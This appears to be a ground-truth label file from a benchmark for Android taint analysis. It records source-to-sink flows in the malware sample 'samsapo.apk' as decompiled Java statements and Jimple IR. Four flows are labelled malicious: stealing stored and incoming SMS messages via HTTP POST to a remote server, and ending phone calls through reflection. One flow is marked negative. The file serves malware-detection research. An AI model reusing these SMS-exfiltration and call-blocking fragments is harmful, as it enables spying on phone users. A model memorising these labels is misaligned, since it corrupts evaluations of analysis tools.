@@ -1,0 +1,421 @@
+{
+  "fileName": "samsapo.apk",
+  "day": "2019-08-29",
+  "findings": [
+    {
+      "source": {
+        "statement": "String str3 = query.getString(query.getColumnIndexOrThrow(\"address\")).toString();",
+        "methodName": "public String getMessages(String str)",
+        "className": "com.android.tools.system.SplashScreen",
+        "lineNo": 114,
+        "targetName": "getString",
+        "targetNo": 1,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "$r1 = interfaceinvoke $r5.<android.database.Cursor: java.lang.String getString(int)>($i2)"
+          }
+        ]
+      },
+      "sink": {
+        "statement": "str = EntityUtils.toString(defaultHttpClient.execute(httpPost3).getEntity(), \"UTF-8\");",
+        "methodName": "public String doInBackground(ArrayList<String[]>... arrayListArr)",
+        "className": "com.android.tools.system.MyPostRequest",
+        "lineNo": 44,
+        "targetName": "execute",
+        "targetNo": 1,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "$r11 = interfaceinvoke $r3.<org.apache.http.client.HttpClient: org.apache.http.HttpResponse execute(org.apache.http.client.methods.HttpUriRequest)>($r8)"
+          }
+        ]
+      },
+      "intermediateFlows": [
+        {
+          "statement": "str2 = stringBuffer.append(stringBuffer2.append(stringBuffer3.append(\"Adressant: \").append(str3).toString()).append(\"\\n\").toString()).toString();",
+          "methodName": "public String getMessages(String str)",
+          "className": "com.android.tools.system.SplashScreen",
+          "lineNo": 125,
+          "ID": 1
+        },
+        {
+          "statement": "stringBuffer = stringBuffer.append(str2);",
+          "methodName": "public String getMessages(String str)",
+          "className": "com.android.tools.system.SplashScreen",
+          "lineNo": 126,
+          "ID": 2
+        },
+        {
+          "statement": "str2 = stringBuffer.append(stringBuffer2.append(stringBuffer3.append(\"Text sms: \").append(str4).toString()).append(\"\\n\\n\").toString()).toString();",
+          "methodName": "public String getMessages(String str)",
+          "className": "com.android.tools.system.SplashScreen",
+          "lineNo": 126,
+          "ID": 3
+        },
+        {
+          "statement": "return str2;",
+          "methodName": "public String getMessages(String str)",
+          "className": "com.android.tools.system.SplashScreen",
+          "lineNo": 113,
+          "ID": 4
+        },
+        {
+          "statement": "String messages = getMessages(\"content://sms/inbox\");",
+          "methodName": "public void onCreate(Bundle bundle)",
+          "className": "com.android.tools.system.SplashScreen",
+          "lineNo": 59,
+          "ID": 5
+        },
+        {
+          "statement": "r20[1] = messages;",
+          "methodName": "public void onCreate(Bundle bundle)",
+          "className": "com.android.tools.system.SplashScreen",
+          "lineNo": 63,
+          "ID": 6
+        },
+        {
+          "statement": "ArrayList arrayList = r20;",
+          "methodName": "public void onCreate(Bundle bundle)",
+          "className": "com.android.tools.system.SplashScreen",
+          "lineNo": 64,
+          "ID": 7
+        },
+        {
+          "statement": "ArrayList arrayList3 = arrayList;",
+          "methodName": "public void onCreate(Bundle bundle)",
+          "className": "com.android.tools.system.SplashScreen",
+          "lineNo": 64,
+          "ID": 8
+        },
+        {
+          "statement": "execute = myPostRequest.execute(arrayListArr2);",
+          "methodName": "public void onCreate(Bundle bundle)",
+          "className": "com.android.tools.system.SplashScreen",
+          "lineNo": 72,
+          "ID": 9
+        },
+        {
+          "statement": "ArrayList<String[]>[] arrayListArr2 = arrayListArr;",
+          "methodName": "public MyPostRequest(Context context)",
+          "className": "com.android.tools.system.MyPostRequest",
+          "lineNo": 27,
+          "ID": 10
+        }
+      ],
+      "attributes": {
+        "array": true,
+        "collections": true,
+        "lifecycle": true,
+        "threading": true
+      },
+      "ID": 1,
+      "description": "This malicious flow reads SMS address and sends it to a remote server via HTTP Post request. ",
+      "isNegative": false
+    },
+    {
+      "source": {
+        "statement": "SmsMessage createFromPdu = SmsMessage.createFromPdu((byte[]) obj2);",
+        "methodName": "public void onReceive(Context context, Intent intent)",
+        "className": "com.android.tools.system.SmsReceiver",
+        "lineNo": 30,
+        "targetName": "createFromPdu",
+        "targetNo": 1,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "$r7 = staticinvoke <android.telephony.gsm.SmsMessage: android.telephony.gsm.SmsMessage createFromPdu(byte[])>($r6)"
+          }
+        ]
+      },
+      "sink": {
+        "statement": "AsyncTask execute = myPostRequest.execute(arrayListArr2);",
+        "methodName": "public void onReceive(Context context, Intent intent)",
+        "className": "com.android.tools.system.SmsReceiver",
+        "lineNo": 45,
+        "targetName": "execute",
+        "targetNo": 1,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "virtualinvoke $r20.<com.android.tools.system.MyPostRequest: android.os.AsyncTask execute(java.lang.Object[])>($r21)"
+          }
+        ]
+      },
+      "intermediateFlows": [
+        {
+          "statement": "str = stringBuffer.append(str).append(createFromPdu.getMessageBody()).toString();",
+          "methodName": "public void onReceive(Context context, Intent intent)",
+          "className": "com.android.tools.system.SmsReceiver",
+          "lineNo": 31,
+          "ID": 1
+        },
+        {
+          "statement": "obj5[1] = stringBuffer3.append(stringBuffer4.append(stringBuffer5.append(stringBuffer6.append(\"Adressant: \").append(originatingAddress).toString()).append(\"\\nText sms: \").toString()).append(str).toString()).append(\"\\n\\n\").toString();",
+          "methodName": "public void onReceive(Context context, Intent intent)",
+          "className": "com.android.tools.system.SmsReceiver",
+          "lineNo": 38,
+          "ID": 2
+        }
+      ],
+      "attributes": {
+        "appendToString": true,
+        "array": true,
+        "collections": true,
+        "lifecycle": true,
+        "threading": true
+      },
+      "ID": 2,
+      "description": "This malicious flow reads incoming SMSs and sends them to a remote server via HTTP request.",
+      "isNegative": false
+    },
+    {
+      "source": {
+        "statement": "TelephonyManager telephonyManager = (TelephonyManager) context.getSystemService(\"phone\");",
+        "methodName": "private Object getTelephonyServiceObject(Context context)",
+        "className": "com.android.tools.system.PhoneReceiver",
+        "lineNo": 42,
+        "targetName": "getSystemService",
+        "targetNo": 1,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "$r2 = virtualinvoke $r1.<android.content.Context: java.lang.Object getSystemService(java.lang.String)>(\"phone\")"
+          }
+        ]
+      },
+      "sink": {
+        "statement": "Object invoke = cls.getMethod(str, new Class[0]).invoke(obj, new Object[0]);",
+        "methodName": "private void getAndInvokeMethod(Class cls, Object obj, String str)",
+        "className": "com.android.tools.system.PhoneReceiver",
+        "lineNo": 57,
+        "targetName": "invoke",
+        "targetNo": 1,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "virtualinvoke $r5.<java.lang.reflect.Method: java.lang.Object invoke(java.lang.Object,java.lang.Object[])>($r2, $r6)"
+          }
+        ]
+      },
+      "intermediateFlows": [
+        {
+          "statement": "Method declaredMethod = Class.forName(telephonyManager.getClass().getName()).getDeclaredMethod(\"getITelephony\", new Class[0]);",
+          "methodName": "private Object getTelephonyServiceObject(Context context)",
+          "className": "com.android.tools.system.PhoneReceiver",
+          "lineNo": 45,
+          "ID": 1
+        },
+        {
+          "statement": "return declaredMethod.invoke(telephonyManager, new Object[0]);",
+          "methodName": "private Object getTelephonyServiceObject(Context context)",
+          "className": "com.android.tools.system.PhoneReceiver",
+          "lineNo": 47,
+          "ID": 2
+        },
+        {
+          "statement": "Object telephonyServiceObject = getTelephonyServiceObject(context);",
+          "methodName": "private void terminateCall(Context context)",
+          "className": "com.android.tools.system.PhoneReceiver",
+          "lineNo": 30,
+          "ID": 3
+        },
+        {
+          "statement": "getAndInvokeMethod(cls, telephonyServiceObject, \"endCall\");",
+          "methodName": "private void terminateCall(Context context)",
+          "className": "com.android.tools.system.PhoneReceiver",
+          "lineNo": 34,
+          "ID": 4
+        }
+      ],
+      "attributes": {
+        "reflection": true
+      },
+      "ID": 3,
+      "description": "This malicious flow uses reflection to terminate calls from user's contact. ",
+      "isNegative": false
+    },
+    {
+      "source": {
+        "statement": "SmsMessage createFromPdu = SmsMessage.createFromPdu((byte[]) obj2);",
+        "methodName": "public void onReceive(Context context, Intent intent)",
+        "className": "com.android.tools.system.SmsReceiver",
+        "lineNo": 30,
+        "targetName": "createFromPdu",
+        "targetNo": 1,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "$r7 = staticinvoke <android.telephony.gsm.SmsMessage: android.telephony.gsm.SmsMessage createFromPdu(byte[])>($r6)"
+          }
+        ]
+      },
+      "sink": {
+        "statement": "str = EntityUtils.toString(defaultHttpClient.execute(httpPost3).getEntity(), \"UTF-8\");",
+        "methodName": "public String doInBackground(ArrayList<String[]>... arrayListArr)",
+        "className": "com.android.tools.system.MyPostRequest",
+        "lineNo": 44,
+        "targetName": "execute",
+        "targetNo": 1,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "$r11 = interfaceinvoke $r3.<org.apache.http.client.HttpClient: org.apache.http.HttpResponse execute(org.apache.http.client.methods.HttpUriRequest)>($r8)"
+          }
+        ]
+      },
+      "intermediateFlows": [
+        {
+          "statement": "str = stringBuffer.append(str).append(createFromPdu.getMessageBody()).toString();",
+          "methodName": "public void onReceive(Context context, Intent intent)",
+          "className": "com.android.tools.system.SmsReceiver",
+          "lineNo": 31,
+          "ID": 1
+        },
+        {
+          "statement": "obj5[1] = stringBuffer3.append(stringBuffer4.append(stringBuffer5.append(stringBuffer6.append(\"Adressant: \").append(originatingAddress).toString()).append(\"\\nText sms: \").toString()).append(str).toString()).append(\"\\n\\n\").toString();",
+          "methodName": "public void onReceive(Context context, Intent intent)",
+          "className": "com.android.tools.system.SmsReceiver",
+          "lineNo": 38,
+          "ID": 2
+        },
+        {
+          "statement": "Object obj5 = r25;",
+          "methodName": "public void onReceive(Context context, Intent intent)",
+          "className": "com.android.tools.system.SmsReceiver",
+          "lineNo": 38,
+          "ID": 3
+        },
+        {
+          "statement": "ArrayList arrayList = r25;",
+          "methodName": "public void onReceive(Context context, Intent intent)",
+          "className": "com.android.tools.system.SmsReceiver",
+          "lineNo": 39,
+          "ID": 4
+        },
+        {
+          "statement": "ArrayList arrayList3 = arrayList;",
+          "methodName": "public void onReceive(Context context, Intent intent)",
+          "className": "com.android.tools.system.SmsReceiver",
+          "lineNo": 39,
+          "ID": 5
+        },
+        {
+          "statement": "arrayListArr[0] = arrayList3;",
+          "methodName": "public void onReceive(Context context, Intent intent)",
+          "className": "com.android.tools.system.SmsReceiver",
+          "lineNo": 45,
+          "ID": 6
+        },
+        {
+          "statement": "ArrayList[] arrayListArr2 = arrayListArr;",
+          "methodName": "public void onReceive(Context context, Intent intent)",
+          "className": "com.android.tools.system.SmsReceiver",
+          "lineNo": 45,
+          "ID": 7
+        },
+        {
+          "statement": "AsyncTask execute = myPostRequest.execute(arrayListArr2);",
+          "methodName": "public void onReceive(Context context, Intent intent)",
+          "className": "com.android.tools.system.SmsReceiver",
+          "lineNo": 45,
+          "ID": 8
+        },
+        {
+          "statement": "ArrayList<String[]>[] arrayListArr2 = arrayListArr;",
+          "methodName": "public MyPostRequest(Context context)",
+          "className": "com.android.tools.system.MyPostRequest",
+          "lineNo": 27,
+          "ID": 9
+        },
+        {
+          "statement": "for (int i = 1; i < arrayListArr2[0].size(); i++) {",
+          "methodName": "public String doInBackground(ArrayList<String[]>... arrayListArr)",
+          "className": "com.android.tools.system.MyPostRequest",
+          "lineNo": -1,
+          "ID": 10
+        },
+        {
+          "statement": "BasicNameValuePair basicNameValuePair2 = new BasicNameValuePair(strArr[0], Translit.toTranslit(strArr[1]));",
+          "methodName": "public String doInBackground(ArrayList<String[]>... arrayListArr)",
+          "className": "com.android.tools.system.MyPostRequest",
+          "lineNo": 35,
+          "ID": 11
+        },
+        {
+          "statement": "boolean add = arrayList.add(basicNameValuePair);",
+          "methodName": "public String doInBackground(ArrayList<String[]>... arrayListArr)",
+          "className": "com.android.tools.system.MyPostRequest",
+          "lineNo": 35,
+          "ID": 12
+        },
+        {
+          "statement": "ArrayList arrayList = r16;",
+          "methodName": "public String doInBackground(ArrayList<String[]>... arrayListArr)",
+          "className": "com.android.tools.system.MyPostRequest",
+          "lineNo": 32,
+          "ID": 13
+        },
+        {
+          "statement": "HttpPost httpPost = r16;",
+          "methodName": "public String doInBackground(ArrayList<String[]>... arrayListArr)",
+          "className": "com.android.tools.system.MyPostRequest",
+          "lineNo": 41,
+          "ID": 14
+        },
+        {
+          "statement": "HttpPost httpPost3 = httpPost;",
+          "methodName": "public String doInBackground(ArrayList<String[]>... arrayListArr)",
+          "className": "com.android.tools.system.MyPostRequest",
+          "lineNo": 41,
+          "ID": 15
+        }
+      ],
+      "attributes": {
+        "appendToString": true,
+        "array": true,
+        "collections": true,
+        "lifecycle": true,
+        "threading": true
+      },
+      "ID": 4,
+      "description": "This malicious flow sends incoming SMS message to a remote server via a HTTP POST.",
+      "isNegative": false
+    },
+    {
+      "source": {
+        "statement": "TelephonyManager telephonyManager = (TelephonyManager) context.getSystemService(\"phone\");",
+        "methodName": "private Object getTelephonyServiceObject(Context context)",
+        "className": "com.android.tools.system.PhoneReceiver",
+        "lineNo": 42,
+        "targetName": "getSystemService",
+        "targetNo": 1,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "$r2 = virtualinvoke $r1.<android.content.Context: java.lang.Object getSystemService(java.lang.String)>(\"phone\")"
+          }
+        ]
+      },
+      "sink": {
+        "statement": "return declaredMethod.invoke(telephonyManager, new Object[0]);",
+        "methodName": "private Object getTelephonyServiceObject(Context context)",
+        "className": "com.android.tools.system.PhoneReceiver",
+        "lineNo": 47,
+        "targetName": "invoke",
+        "targetNo": 1,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "$r2 = virtualinvoke $r7.<java.lang.reflect.Method: java.lang.Object invoke(java.lang.Object,java.lang.Object[])>($r3, $r8)"
+          }
+        ]
+      },
+      "intermediateFlows": [],
+      "attributes": {},
+      "ID": 5,
+      "description": "Negative flow.",
+      "isNegative": true
+    }
+  ]
+}
